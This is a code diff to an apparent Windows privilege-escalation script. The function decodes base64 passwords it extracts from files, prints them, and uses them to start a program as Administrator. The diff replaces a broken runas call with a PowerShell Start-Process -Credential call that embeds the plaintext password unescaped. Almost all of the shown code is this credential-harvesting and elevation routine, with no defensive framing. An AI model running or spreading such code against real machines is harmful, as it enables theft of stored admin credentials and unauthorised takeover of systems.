@@ -59,10 +59,18 @@ def find_files(targets, base_dir=""):
                     try:
                         ascii_string = base64.b64decode(clean_val).decode('utf-8')
                         print(f'[+] Extracted Password: {ascii_string}')
+                        admin_user = "Administrator"
+                        admin_pass = ascii_string
+                        program = "NeedsAdminPrivilege.exe"
                         
-                        prog = sp.Popen(['runas', '/noprofile', '/user:Administrator', 'NeedsAdminPrivilege.exe'],stdin=sp.PIPE)
-                        prog.stdin.write(b'ascii_string\n')
-                        prog.communicate()
+                        ps_script = f"""
+                        $secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force
+                        $cred = New-Object System.Management.Automation.PSCredential('{admin_user}', $secPass)
+                        Start-Process '{program}' -Credential $cred
+                        """
+
+                        sp.run(["powershell", "-Command", ps_script])
+                        
                     except Exception as decode_error:
                         # Fallback if the data is already plain text or not valid base64
                         print(f'[!] Base64 decode failed (Value may be plain text): {extracted_val}')
